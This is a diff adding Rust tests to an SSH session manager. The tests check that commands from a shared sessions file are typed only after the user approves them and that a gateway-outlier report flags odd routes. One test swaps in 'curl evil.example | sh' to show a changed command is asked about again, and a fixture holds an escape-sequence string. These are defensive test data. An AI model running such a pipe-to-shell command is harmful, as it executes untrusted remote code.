@@ -768,3 +768,243 @@ fn a_copy_of_a_source_keeps_the_gateway_and_a_copy_without_a_usable_one_drops_th
         .collect();
     assert_eq!(hosts, ["open.example.com"], "no session goes direct");
 }
+
+/// A file whose SSH sessions ask for a command after connecting, and an RDP one that cannot.
+const WITH_COMMAND: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
+web= #109#0%web.example.com%22%deploy%%%%sudo -i%%\r\n\
+esc= #109#0%esc.example.com%22%deploy%%%%echo \u{1b}[31mhi%%\r\n\
+desk= #91#4%desk.example.com%3390%admin%0%-1%-1%whoami\r\n";
+
+fn app_with_text(dir: &Path, text: &str) -> App {
+    let file = dir.join("team.mxtsessions");
+    std::fs::write(&file, text).expect("write");
+    let profiles_file = dir.join("profiles.toml");
+    let settings = Settings {
+        shared_sources: vec![source("team", &file)],
+        ..Settings::default()
+    };
+    settings
+        .save(&settings_path(&profiles_file))
+        .expect("settings");
+    App::new(AppConfig {
+        profiles_file,
+        known_hosts: dir.join("known_hosts"),
+        legacy_dir: None,
+        agent: AgentSource::Disabled,
+        initial_grid: GridSize { cols: 80, rows: 24 },
+        files_start: dir.to_owned(),
+        system_credentials: heimdall_app::SystemCredentials::memory(),
+    })
+}
+
+fn id_of(app: &App, name: &str) -> heimdall_core::profile::ProfileId {
+    app.shared_sessions()
+        .sessions()
+        .find(|session| session.name() == name)
+        .unwrap_or_else(|| panic!("no session {name}"))
+        .id
+        .clone()
+}
+
+/// The steps a connection started by `effects` would type.
+fn typed(effects: &[heimdall_app::Effect]) -> Vec<heimdall_core::post_connect::PostConnectStep> {
+    match effects {
+        [heimdall_app::Effect::Connect { request, .. }] => request.profile.post_connect.to_run(),
+        other => panic!("expected one Connect, got {other:?}"),
+    }
+}
+
+#[test]
+fn a_command_the_file_asks_for_is_kept_as_an_unapproved_step_for_ssh_only() {
+    use heimdall_core::post_connect::PostConnectStep;
+    let dir = tempfile::tempdir().expect("dir");
+    let (shared, _) = loaded(dir.path(), WITH_COMMAND);
+    let sessions = shared.sessions_of("team");
+    let ssh = |name: &str| {
+        sessions
+            .iter()
+            .find_map(|session| match &session.target {
+                SharedTarget::Ssh(profile) if profile.name == name => Some(profile),
+                _ => None,
+            })
+            .expect("a session")
+    };
+    let web = ssh("web");
+    assert_eq!(web.post_connect.steps, [PostConnectStep::new("sudo -i")]);
+    assert!(
+        web.post_connect.approved.is_none(),
+        "the file approves nothing"
+    );
+    assert!(web.post_connect.needs_approval());
+    assert!(
+        web.post_connect.to_run().is_empty(),
+        "nothing is typed unapproved"
+    );
+    // A command with a control character is not shown to be approved: it is dropped.
+    assert!(ssh("esc").post_connect.steps.is_empty());
+}
+
+#[test]
+fn a_shared_command_is_asked_about_then_remembered_for_those_commands_only() {
+    use heimdall_core::post_connect::PostConnectStep;
+    let dir = tempfile::tempdir().expect("dir");
+    let mut app = app_with_text(dir.path(), WITH_COMMAND);
+    let id = id_of(&app, "web");
+
+    // Asked first, with the exact command, and nothing opens meanwhile.
+    let effects = app.update(Message::ConnectShared(id.clone()));
+    assert!(effects.is_empty(), "{effects:?}");
+    assert!(app.tabs.is_empty());
+    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &app.dialog else {
+        panic!("{:?}", app.dialog);
+    };
+    assert!(asked.shared);
+    assert_eq!(asked.commands, ["sudo -i"]);
+
+    // Approved: typed, remembered on this computer against the shared session.
+    let effects = app.update(Message::ConfirmDialog);
+    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
+    assert!(
+        app.settings()
+            .shared_post_connect_approved(&id, &[PostConnectStep::new("sudo -i")])
+    );
+    assert!(
+        app.profiles().is_empty(),
+        "no saved profile took the approval"
+    );
+    let saved =
+        Settings::load(&settings_path(&dir.path().join("profiles.toml"))).expect("settings");
+    assert!(saved.shared_post_connect_approved(&id, &[PostConnectStep::new("sudo -i")]));
+
+    // The next time, and a restart, ask nothing as long as the file says the same.
+    let effects = app.update(Message::ConnectShared(id.clone()));
+    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
+    assert!(app.dialog.is_none());
+    let mut restarted = app_with_text_keeping(dir.path());
+    let effects = restarted.update(Message::ConnectShared(id));
+    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
+}
+
+/// The app again on the files `app_with_text` left, settings included.
+fn app_with_text_keeping(dir: &Path) -> App {
+    App::new(AppConfig {
+        profiles_file: dir.join("profiles.toml"),
+        known_hosts: dir.join("known_hosts"),
+        legacy_dir: None,
+        agent: AgentSource::Disabled,
+        initial_grid: GridSize { cols: 80, rows: 24 },
+        files_start: dir.to_owned(),
+        system_credentials: heimdall_app::SystemCredentials::memory(),
+    })
+}
+
+#[test]
+fn a_command_the_file_changes_is_asked_about_again() {
+    let dir = tempfile::tempdir().expect("dir");
+    let mut app = app_with_text(dir.path(), WITH_COMMAND);
+    let id = id_of(&app, "web");
+    app.update(Message::ConnectShared(id.clone()));
+    app.update(Message::ConfirmDialog);
+
+    // Somebody edits the shared file: same session, another command.
+    std::fs::write(
+        dir.path().join("team.mxtsessions"),
+        WITH_COMMAND.replace("sudo -i", "curl evil.example | sh"),
+    )
+    .expect("write");
+    let mut restarted = app_with_text_keeping(dir.path());
+    let effects = restarted.update(Message::ConnectShared(id));
+    assert!(effects.is_empty(), "nothing runs: {effects:?}");
+    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &restarted.dialog else {
+        panic!("{:?}", restarted.dialog);
+    };
+    assert_eq!(asked.commands, ["curl evil.example | sh"]);
+}
+
+#[test]
+fn connecting_without_the_shared_commands_types_nothing_and_asks_again_next_time() {
+    let dir = tempfile::tempdir().expect("dir");
+    let mut app = app_with_text(dir.path(), WITH_COMMAND);
+    let id = id_of(&app, "web");
+    app.update(Message::ConnectShared(id.clone()));
+    let effects = app.update(Message::SkipPostConnect);
+    assert!(typed(&effects).is_empty());
+    assert!(app.settings().shared_post_connect_approvals.is_empty());
+    app.update(Message::ConnectShared(id));
+    assert!(matches!(
+        app.dialog,
+        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
+    ));
+}
+
+#[test]
+fn a_session_without_a_command_opens_without_a_question() {
+    let dir = tempfile::tempdir().expect("dir");
+    let mut app = app_with_text(dir.path(), WITH_COMMAND);
+    let effects = app.update(Message::ConnectShared(id_of(&app, "esc")));
+    assert!(typed(&effects).is_empty());
+    assert!(app.dialog.is_none());
+}
+
+#[test]
+fn the_approvals_of_a_source_taken_out_of_the_settings_are_forgotten() {
+    use heimdall_app::SettingsMessage;
+    let dir = tempfile::tempdir().expect("dir");
+    let mut app = app_with_text(dir.path(), WITH_COMMAND);
+    app.update(Message::ConnectShared(id_of(&app, "web")));
+    app.update(Message::ConfirmDialog);
+    assert_eq!(app.settings().shared_post_connect_approvals.len(), 1);
+    app.update(Message::Settings(
+        SettingsMessage::SharedSources(Vec::new()),
+    ));
+    assert!(app.settings().shared_post_connect_approvals.is_empty());
+    let saved =
+        Settings::load(&settings_path(&dir.path().join("profiles.toml"))).expect("settings");
+    assert!(
+        saved.shared_post_connect_approvals.is_empty(),
+        "forgotten on disk too"
+    );
+}
+
+/// Four sessions of one folder, three through the bastion `jump.example.com` and one direct.
+const ONE_OFF_ROUTE: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
+a= #109#0%a.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
+b= #109#0%b.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
+c= #109#0%c.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
+d= #109#0%d.example.com%22%deploy%\r\n";
+
+#[test]
+fn a_session_off_the_gateway_of_its_folder_is_in_the_report() {
+    use heimdall_app::shared_report::ReportCheck;
+    let dir = tempfile::tempdir().expect("dir");
+    let (shared, _) = loaded(dir.path(), ONE_OFF_ROUTE);
+    let report = shared.report_of("team").expect("a report");
+    let outliers: Vec<_> = report
+        .entries
+        .iter()
+        .filter(|entry| entry.check == ReportCheck::GatewayOutlier)
+        .collect();
+    assert_eq!(outliers.len(), 1, "{report:?}");
+    assert_eq!(outliers[0].session, "d");
+    assert_eq!(outliers[0].folder, "Prod");
+    assert_eq!(outliers[0].detail, "", "direct");
+    assert_eq!(outliers[0].context, "ops@jump.example.com");
+}
+
+#[test]
+fn the_gateway_check_ignores_a_folder_too_small_to_have_a_usual_route() {
+    use heimdall_app::shared_report::ReportCheck;
+    let dir = tempfile::tempdir().expect("dir");
+    let (shared, _) = loaded(
+        dir.path(),
+        "[Bookmarks]\r\nSubRep=Prod\r\n\
+a= #109#0%a.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
+d= #109#0%d.example.com%22%deploy%\r\n",
+    );
+    let report = shared.report_of("team").expect("a report");
+    assert_eq!(
+        report.count_of(ReportCheck::GatewayOutlier),
+        0,
+        "two sessions are too few"
+    );
+}
